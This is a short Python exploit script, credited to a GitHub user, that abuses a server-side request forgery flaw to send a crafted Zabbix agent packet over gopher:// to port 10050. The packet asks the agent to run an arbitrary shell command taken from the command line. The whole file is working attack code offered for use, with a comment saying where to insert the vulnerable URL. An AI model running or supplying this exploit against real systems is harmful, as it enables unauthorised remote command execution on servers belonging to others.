'''

######################################
                                     @
Made by: frRaul                      @
GitHub: https://github.com/frRaul    @
                                     @
######################################

'''

from pwn import *
import urllib
import requests
import sys

header = "ZBXD\x01"
key = "system.run["+sys.argv[1]+"]"
url = "gopher://127.0.0.1:10050/_"

ssrf_url = "http://127.0.0.1/?vulnerable_parameter=" # Change this to the >complete< vulnerable URL. Like this URL.

lengh = str(p64(len(key) + 2).decode('utf-8', 'ignore'))

payload = header+lengh+key

final_url = (ssrf_url + url + urllib.parse.quote(urllib.parse.quote(payload)))

r = requests.get(final_url)

print(r.text)